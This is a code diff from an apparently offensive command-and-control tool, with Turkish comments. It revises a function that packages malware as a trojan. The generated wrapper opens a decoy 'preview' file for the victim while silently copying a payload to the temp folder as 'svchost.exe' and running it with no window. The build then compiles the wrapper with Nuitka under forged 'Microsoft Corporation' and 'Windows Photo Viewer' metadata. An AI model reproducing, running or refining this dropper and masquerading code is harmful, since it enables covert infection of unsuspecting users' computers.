@@ -585,36 +585,48 @@ def c2_disguise():
 
     # 5. Yem dosyayı EXE'ye göm (varsa)
     if decoy_path and os.path.exists(decoy_path):
-        print(f"{C.YELLOW}  [*] Yem dosya gömülüyor...{C.RESET}")
-        # Wrapper oluştur: yem dosyayı aç + orijinal EXE'yi çalıştır
+        print(f"{C.YELLOW}  [*] Yem dosya ile wrapper oluşturuluyor...{C.RESET}")
         decoy_ext = os.path.splitext(decoy_path)[1]
-        with open(decoy_path, 'rb') as f:
-            decoy_b64 = base64.b64encode(f.read()).decode()
-        with open(exe_path, 'rb') as f:
-            exe_b64 = base64.b64encode(f.read()).decode()
+        decoy_name = "decoy" + decoy_ext
+        payload_name = "payload.exe"
 
-        wrapper_code = f'''import sys,os,base64,subprocess,tempfile
+        # Dosyaları stealth_dropper'a kopyala
+        import shutil
+        decoy_copy = os.path.join('stealth_dropper', decoy_name)
+        payload_copy = os.path.join('stealth_dropper', payload_name)
+        shutil.copy2(decoy_path, decoy_copy)
+        shutil.copy2(exe_path, payload_copy)
+
+        # Wrapper: dosyaları temp'e çıkar ve çalıştır
+        wrapper_code = f'''import sys,os,subprocess,tempfile,shutil
 try:
     if sys.stdout is None: sys.stdout=open(os.devnull,"w")
     if sys.stderr is None: sys.stderr=open(os.devnull,"w")
 except: pass
 tmp=tempfile.gettempdir()
+# Bundled dosyalari bul
+if getattr(sys,"frozen",False):
+    base=os.path.dirname(sys.executable)
+else:
+    base=os.path.dirname(__file__)
 # Yem dosyayi ac
-decoy=os.path.join(tmp,"preview{decoy_ext}")
-with open(decoy,"wb") as f:
-    f.write(base64.b64decode("{decoy_b64}"))
-os.startfile(decoy)
-# Payload'i calistir
-payload=os.path.join(tmp,"svchost.exe")
-with open(payload,"wb") as f:
-    f.write(base64.b64decode("{exe_b64}"))
-subprocess.Popen([payload],creationflags=0x08000000)
+decoy_src=os.path.join(base,"{decoy_name}")
+decoy_dst=os.path.join(tmp,"preview{decoy_ext}")
+if os.path.exists(decoy_src):
+    shutil.copy2(decoy_src,decoy_dst)
+    os.startfile(decoy_dst)
+# Payload calistir
+pay_src=os.path.join(base,"{payload_name}")
+pay_dst=os.path.join(tmp,"svchost.exe")
+if os.path.exists(pay_src):
+    shutil.copy2(pay_src,pay_dst)
+    subprocess.Popen([pay_dst],creationflags=0x08000000)
 '''
         wrapper_path = os.path.join('stealth_dropper', '_wrapper.py')
         save_text(wrapper_path, wrapper_code)
 
-        # Nuitka ile derle
-        print(f"{C.YELLOW}  [*] Wrapper derleniyor...{C.RESET}")
+        # Nuitka ile derle — dosyaları --include-data-files ile göm
+        print(f"{C.YELLOW}  [*] Nuitka ile derleniyor...{C.RESET}")
         final_exe = os.path.join('stealth_dropper', 'disguised.exe')
         result = subprocess.run(
             [sys.executable, '-m', 'nuitka',
@@ -625,11 +637,15 @@ subprocess.Popen([payload],creationflags=0x08000000)
              '--assume-yes-for-downloads',
              '--windows-company-name=Microsoft Corporation',
              '--windows-product-name=Windows Photo Viewer',
+             f'--include-data-files={os.path.abspath(decoy_copy)}={decoy_name}',
+             f'--include-data-files={os.path.abspath(payload_copy)}={payload_name}',
              wrapper_path],
             capture_output=True, text=True
         )
-        try: os.remove(wrapper_path)
-        except: pass
+        # Temizlik
+        for f in [wrapper_path, decoy_copy, payload_copy]:
+            try: os.remove(f)
+            except: pass
     else:
         final_exe = exe_path
 
